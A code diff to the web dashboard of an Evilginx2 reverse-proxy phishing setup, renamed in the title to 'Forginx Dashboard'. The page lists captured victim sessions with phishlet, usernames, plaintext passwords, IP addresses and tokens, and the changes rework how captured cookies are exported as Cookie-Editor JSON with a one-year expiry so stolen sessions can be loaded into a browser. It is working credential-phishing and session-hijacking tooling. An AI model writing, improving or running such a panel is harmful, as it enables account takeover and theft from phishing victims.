@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Evilginx2 Dashboard</title>
+<title>Forginx Dashboard</title>
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; }
 body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0d1117; color: #c9d1d9; font-size: 14px; }
@@ -18,7 +18,7 @@ h1 span { color: #58a6ff; }
 .controls { display: flex; gap: 10px; align-items: center; }
 .search-box { padding: 6px 12px; background: #21262d; border: 1px solid #30363d; border-radius: 6px; color: #c9d1d9; font-size: 13px; width: 200px; }
 .search-box:focus { outline: none; border-color: #58a6ff; }
-.btn { padding: 6px 14px; border-radius: 6px; border: 1px solid #30363d; background: #21262d; color: #c9d1d9; cursor: pointer; font-size: 13px; transition: background .2s; }
+.btn { padding: 6px 14px; border-radius: 6px; border: 1px solid #30363d; background: #21262d; color: #c9d1d9; cursor: pointer; font-size: 13px; transition: background .2s; user-select: none; }
 .btn:hover { background: #30363d; }
 .btn-primary { background: #238636; border-color: rgba(240,246,252,0.1); color: #fff; }
 .btn-primary:hover { background: #2ea043; }
@@ -43,18 +43,13 @@ tr.expanded > td { background: #161b22; }
 .detail-row { display: none; }
 tr.expanded + .detail-row { display: table-row; }
 .detail-row td { padding: 0; }
-.detail-inner { padding: 16px 20px 20px; background: #161b22; border-bottom: 1px solid #30363d; }
+.detail-inner { padding: 20px; background: #161b22; border-bottom: 1px solid #30363d; }
 .detail-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom: 16px; }
-.detail-section { }
 .detail-section h3 { font-size: 12px; text-transform: uppercase; letter-spacing: 0.05em; color: #8b949e; margin-bottom: 8px; }
 .detail-field { margin-bottom: 6px; }
 .detail-field .label { font-size: 11px; color: #8b949e; display: block; }
 .detail-field .value { font-size: 13px; color: #f0f6fc; word-break: break-all; font-family: monospace; }
 .detail-field .value.empty { color: #484f58; font-style: italic; }
-.cookie-section { margin-bottom: 10px; }
-.cookie-section h4 { font-size: 12px; color: #f0883e; margin-bottom: 4px; }
-.cookie-entry { font-size: 12px; font-family: monospace; color: #7ee787; padding: 2px 0; }
-.copy-btn { margin-top: 10px; }
 .copy-toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: #238636; color: #fff; padding: 8px 20px; border-radius: 6px; font-size: 13px; opacity: 0; transition: opacity .3s; pointer-events: none; z-index: 100; }
 .copy-toast.show { opacity: 1; }
 .empty-state { text-align: center; padding: 60px 20px; color: #484f58; }
@@ -70,7 +65,8 @@ tr.deleted td { opacity: 0.3; }
 .modal h2 { font-size: 16px; margin-bottom: 12px; }
 .modal p { font-size: 14px; color: #8b949e; margin-bottom: 20px; }
 .modal-actions { display: flex; gap: 10px; justify-content: flex-end; }
-.cookie-json { background: #0d1117; border: 1px solid #30363d; border-radius: 6px; padding: 12px; font-family: monospace; font-size: 12px; color: #7ee787; max-height: 200px; overflow: auto; white-space: pre-wrap; word-break: break-all; margin-top: 8px; }
+.copy-section { margin-top: 12px; }
+.copy-section textarea { width: 100%; background: #0d1117; border: 1px solid #30363d; border-radius: 6px; padding: 12px; font-family: monospace; font-size: 11px; color: #7ee787; min-height: 120px; max-height: 300px; resize: vertical; white-space: pre; overflow: auto; }
 @media (max-width: 768px) {
   .detail-grid { grid-template-columns: 1fr; }
   .controls { flex-wrap: wrap; }
@@ -85,7 +81,7 @@ tr.deleted td { opacity: 0.3; }
       <div class="status" id="status"><span class="dot green"></span>Connected</div>
     </div>
     <div class="controls">
-      <input type="text" class="search-box" id="search" placeholder="Search sessions..." oninput="renderSessions()">
+      <input type="text" class="search-box" id="search" placeholder="Search..." oninput="renderSessions()">
       <button class="btn" onclick="refreshSessions()">Refresh</button>
     </div>
   </header>
@@ -130,13 +126,11 @@ tr.deleted td { opacity: 0.3; }
 <script>
 const AUTH_TOKEN = '__AUTH_TOKEN__';
 let sessions = [];
-let pollTimer = null;
+let expandedIds = new Set();
+let pendingDeleteId = null;
 
 function getAuthParams() {
-  if (AUTH_TOKEN && AUTH_TOKEN !== '') {
-    return '?auth=' + encodeURIComponent(AUTH_TOKEN);
-  }
-  return '';
+  return (AUTH_TOKEN && AUTH_TOKEN !== '') ? '?auth=' + encodeURIComponent(AUTH_TOKEN) : '';
 }
 
 async function refreshSessions() {
@@ -154,6 +148,15 @@ async function refreshSessions() {
     document.getElementById('table-wrap').style.display = 'none';
     document.getElementById('empty').style.display = 'none';
   }
+}
+
+function toggleDetail(id) {
+  if (expandedIds.has(id)) {
+    expandedIds.delete(id);
+  } else {
+    expandedIds.add(id);
+  }
+  renderSessions();
 }
 
 function renderSessions() {
@@ -182,12 +185,14 @@ function renderSessions() {
     const hasTokens = (s.tokens && Object.keys(s.tokens).length > 0) ||
                       (s.body_tokens && Object.keys(s.body_tokens).length > 0) ||
                       (s.http_tokens && Object.keys(s.http_tokens).length > 0);
-    
-    const isExpanded = tbody.querySelector(`tr[data-id="${s.id}"].expanded`) !== null;
+    const isExpanded = expandedIds.has(s.id);
 
     const tr = document.createElement('tr');
     tr.dataset.id = s.id;
     if (isExpanded) tr.classList.add('expanded');
+    tr.onclick = function(e) {
+      if (e.target.tagName !== 'BUTTON' && e.target.tagName !== 'TEXTAREA') toggleDetail(s.id);
+    };
 
     tr.innerHTML = `
       <td class="id-cell">${s.id}</td>
@@ -198,105 +203,95 @@ function renderSessions() {
       <td class="ip-cell">${escHtml(s.remote_addr)}</td>
       <td class="time-cell">${formatTime(s.update_time)}</td>
       <td class="actions-cell">
-        <button class="btn btn-sm" onclick="toggleDetail(${s.id})">${isExpanded ? 'Collapse' : 'View'}</button>
-        <button class="btn btn-sm btn-danger" onclick="confirmDelete(${s.id})">Delete</button>
+        <button class="btn btn-sm" onclick="event.stopPropagation(); toggleDetail(${s.id})">${isExpanded ? 'Collapse' : 'View'}</button>
+        <button class="btn btn-sm btn-danger" onclick="event.stopPropagation(); confirmDelete(${s.id})">Delete</button>
       </td>
     `;
-    tr.onclick = function(e) {
-      if (e.target.tagName !== 'BUTTON') toggleDetail(s.id);
-    };
     tbody.appendChild(tr);
 
-    const detailRow = document.createElement('tr');
-    detailRow.className = 'detail-row';
-    detailRow.dataset.id = s.id;
-    if (isExpanded) detailRow.style.display = 'table-row';
-    
-    let detailHtml = '<td colspan="8"><div class="detail-inner">';
-    detailHtml += '<div class="detail-grid">';
-    
-    detailHtml += '<div class="detail-section">';
-    detailHtml += '<h3>Session Info</h3>';
-    detailHtml += fieldHtml('Session ID', s.session_id || '-');
-    detailHtml += fieldHtml('Phishlet', s.phishlet);
-    detailHtml += fieldHtml('Username', s.username || '<span class="empty">empty</span>');
-    detailHtml += fieldHtml('Password', s.password || '<span class="empty">empty</span>');
-    detailHtml += fieldHtml('Landing URL', s.landing_url || '-');
-    detailHtml += fieldHtml('User-Agent', s.useragent || '-');
-    detailHtml += fieldHtml('Remote IP', s.remote_addr || '-');
-    detailHtml += fieldHtml('Created', formatTime(s.create_time));
-    detailHtml += fieldHtml('Updated', formatTime(s.update_time));
-    detailHtml += '</div>';
+    if (isExpanded) {
+      const detailRow = document.createElement('tr');
+      detailRow.className = 'detail-row';
+      detailRow.style.display = 'table-row';
+      detailRow.dataset.id = s.id;
 
-    detailHtml += '<div class="detail-section">';
-    if (s.custom && Object.keys(s.custom).length > 0) {
-      detailHtml += '<h3>Custom Fields</h3>';
-      for (const [k, v] of Object.entries(s.custom)) {
-        detailHtml += fieldHtml(k, v);
-      }
-    }
-    if (s.body_tokens && Object.keys(s.body_tokens).length > 0) {
-      detailHtml += '<h3 style="margin-top:10px;">Body Tokens</h3>';
-      for (const [k, v] of Object.entries(s.body_tokens)) {
-        detailHtml += fieldHtml(k, v);
-      }
-    }
-    if (s.http_tokens && Object.keys(s.http_tokens).length > 0) {
-      detailHtml += '<h3 style="margin-top:10px;">HTTP Tokens</h3>';
-      for (const [k, v] of Object.entries(s.http_tokens)) {
-        detailHtml += fieldHtml(k, v);
-      }
-    }
-    detailHtml += '</div></div>';
+      let html = '<td colspan="8"><div class="detail-inner">';
+      html += '<div class="detail-grid">';
+      html += '<div class="detail-section">';
+      html += '<h3>Session Info</h3>';
+      html += fieldHtml('Session ID', s.session_id || '-');
+      html += fieldHtml('Phishlet', s.phishlet);
+      html += fieldHtml('Username', s.username || '<span class="empty">empty</span>');
+      html += fieldHtml('Password', s.password || '<span class="empty">empty</span>');
+      html += fieldHtml('Landing URL', s.landing_url || '-');
+      html += fieldHtml('User-Agent', s.useragent || '-');
+      html += fieldHtml('Remote IP', s.remote_addr || '-');
+      html += fieldHtml('Created', formatTime(s.create_time));
+      html += fieldHtml('Updated', formatTime(s.update_time));
+      html += '</div>';
 
-    if (s.tokens && Object.keys(s.tokens).length > 0) {
-      detailHtml += '<div class="cookie-section"><h3>Cookies</h3>';
-      for (const [domain, cookies] of Object.entries(s.tokens)) {
-        detailHtml += `<h4>${escHtml(domain)}</h4>`;
-        for (const [name, c] of Object.entries(cookies)) {
-          detailHtml += `<div class="cookie-entry">${escHtml(name)}: ${escHtml(truncStr(c.value || c.Value || '', 80))}</div>`;
+      html += '<div class="detail-section">';
+      if (s.custom && Object.keys(s.custom).length > 0) {
+        html += '<h3>Custom Fields</h3>';
+        for (const [k, v] of Object.entries(s.custom)) {
+          html += fieldHtml(k, v);
         }
       }
-      detailHtml += '</div>';
-      const cookieJson = getCookieEditorJson(s.tokens);
-      detailHtml += `<div class="cookie-json" id="cookie-json-${s.id}">${escHtml(cookieJson)}</div>`;
-      detailHtml += `<button class="btn btn-primary btn-sm copy-btn" onclick="copyCookies(${s.id})">Copy Cookies (Cookie-Editor)</button>`;
-    } else {
-      detailHtml += '<div class="detail-field"><span class="value empty">No cookies captured</span></div>';
+      if (s.body_tokens && Object.keys(s.body_tokens).length > 0) {
+        html += '<h3 style="margin-top:10px;">Body Tokens</h3>';
+        for (const [k, v] of Object.entries(s.body_tokens)) {
+          html += fieldHtml(k, v);
+        }
+      }
+      if (s.http_tokens && Object.keys(s.http_tokens).length > 0) {
+        html += '<h3 style="margin-top:10px;">HTTP Tokens</h3>';
+        for (const [k, v] of Object.entries(s.http_tokens)) {
+          html += fieldHtml(k, v);
+        }
+      }
+      html += '</div></div>';
+
+      if (s.tokens && Object.keys(s.tokens).length > 0) {
+        const cookieJson = buildCookieEditorJson(s.tokens);
+        html += '<div class="copy-section">';
+        html += '<h3 style="font-size:12px;text-transform:uppercase;letter-spacing:0.05em;color:#8b949e;margin-bottom:6px;">Cookies (Cookie-Editor JSON)</h3>';
+        html += '<textarea id="cookie-json-' + s.id + '" readonly onclick="this.select()">' + escHtml(cookieJson) + '</textarea>';
+        html += '<button class="btn btn-primary btn-sm" style="margin-top:8px;" onclick="copyCookies(' + s.id + ')">Copy Cookies JSON</button>';
+        html += '</div>';
+      } else {
+        html += '<div class="detail-field"><span class="value empty">No cookies captured</span></div>';
+      }
+
+      html += '</div></td>';
+      detailRow.innerHTML = html;
+      tbody.appendChild(detailRow);
     }
-
-    detailHtml += '</div></td>';
-    detailRow.innerHTML = detailHtml;
-    tbody.appendChild(detailRow);
   }
 }
 
-function toggleDetail(id) {
-  const rows = document.querySelectorAll(`tr[data-id="${id}"]`);
-  rows.forEach(r => r.classList.toggle('expanded'));
-  const detailRow = document.querySelector(`tr.detail-row[data-id="${id}"]`);
-  if (detailRow) {
-    detailRow.style.display = detailRow.style.display === 'table-row' ? 'none' : 'table-row';
-  }
-}
-
-function getCookieEditorJson(tokens) {
-  const cookies = [];
-  for (const [domain, cookieMap] of Object.entries(tokens)) {
-    for (const [name, c] of Object.entries(cookieMap)) {
-      const value = c.value || c.Value || '';
-      const path = c.path || c.Path || '/';
-      const httpOnly = c.httpOnly || c.HttpOnly || false;
-      const hostOnly = !domain.startsWith('.');
+function buildCookieEditorJson(tokens) {
+  var cookies = [];
+  for (var domain in tokens) {
+    if (!tokens.hasOwnProperty(domain)) continue;
+    var cookieMap = tokens[domain];
+    for (var name in cookieMap) {
+      if (!cookieMap.hasOwnProperty(name)) continue;
+      var c = cookieMap[name];
+      var value = c.value || c.Value || '';
+      var path = c.path || c.Path || '/';
+      var httpOnly = c.httpOnly || c.HttpOnly || false;
+      var hostOnly = domain.charAt(0) !== '.';
+      var secure = name.indexOf('__Host-') === 0 || name.indexOf('__Secure-') === 0 || false;
       cookies.push({
-        name: name,
-        value: value,
-        domain: hostOnly ? domain : domain.replace(/^\./, ''),
         path: path,
+        domain: domain,
         expirationDate: Math.floor(Date.now() / 1000) + 365 * 86400,
+        value: value,
+        name: name,
         httpOnly: httpOnly,
-        secure: name.startsWith('__Host-') || name.startsWith('__Secure-') || /secure/i.test(domain),
-        sameSite: 'Lax'
+        hostOnly: hostOnly,
+        secure: secure,
+        session: false
       });
     }
   }
@@ -304,44 +299,38 @@ function getCookieEditorJson(tokens) {
 }
 
 async function copyCookies(id) {
-  const s = sessions.find(x => x.id === id);
+  var s = null;
+  for (var i = 0; i < sessions.length; i++) {
+    if (sessions[i].id === id) { s = sessions[i]; break; }
+  }
   if (!s || !s.tokens) return;
-  const json = getCookieEditorJson(s.tokens);
+  var json = buildCookieEditorJson(s.tokens);
   try {
     await navigator.clipboard.writeText(json);
-    showToast('Cookies copied to clipboard in Cookie-Editor format');
-  } catch {
-    const el = document.getElementById('cookie-json-' + id);
-    if (el) {
-      const range = document.createRange();
-      range.selectNodeContents(el);
-      const sel = window.getSelection();
-      sel.removeAllRanges();
-      sel.addRange(range);
-      showToast('Select all and copy (Ctrl+C)');
-    }
+    showToast('Cookies JSON copied to clipboard');
+  } catch (e) {
+    var el = document.getElementById('cookie-json-' + id);
+    if (el) { el.select(); document.execCommand('copy'); showToast('Cookies JSON copied to clipboard'); }
   }
 }
 
 async function deleteSession(id) {
   try {
-    const res = await fetch('/api/sessions/' + id + getAuthParams(), { method: 'DELETE' });
+    var res = await fetch('/api/sessions/' + id + getAuthParams(), { method: 'DELETE' });
     if (!res.ok) throw new Error('HTTP ' + res.status);
-    const row = document.querySelector(`tr[data-id="${id}"]`);
-    if (row) row.classList.add('deleted');
     showToast('Session ' + id + ' deleted');
     closeModal();
+    expandedIds.delete(id);
     setTimeout(refreshSessions, 500);
   } catch (e) {
-    showToast('Failed to delete: ' + e.message);
+    showToast('Failed: ' + e.message);
     closeModal();
   }
 }
 
-let pendingDeleteId = null;
 function confirmDelete(id) {
   pendingDeleteId = id;
-  document.getElementById('confirmText').textContent = 'Are you sure you want to delete session ID ' + id + '?';
+  document.getElementById('confirmText').textContent = 'Delete session ID ' + id + '?';
   document.getElementById('confirmModal').classList.add('active');
   document.getElementById('confirmDeleteBtn').onclick = function() {
     if (pendingDeleteId !== null) deleteSession(pendingDeleteId);
@@ -354,11 +343,11 @@ function closeModal() {
 }
 
 function showToast(msg) {
-  const el = document.getElementById('toast');
+  var el = document.getElementById('toast');
   el.textContent = msg;
   el.classList.add('show');
   clearTimeout(el._timeout);
-  el._timeout = setTimeout(() => el.classList.remove('show'), 2500);
+  el._timeout = setTimeout(function() { el.classList.remove('show'); }, 2500);
 }
 
 function escHtml(s) {
@@ -373,12 +362,12 @@ function truncStr(s, n) {
 }
 
 function fieldHtml(label, value) {
-  return `<div class="detail-field"><span class="label">${escHtml(label)}</span><span class="value">${value}</span></div>`;
+  return '<div class="detail-field"><span class="label">' + escHtml(label) + '</span><span class="value">' + value + '</span></div>';
 }
 
 function formatTime(ts) {
   if (!ts) return '-';
-  const d = new Date(ts * 1000);
+  var d = new Date(ts * 1000);
   return d.toLocaleString();
 }
 
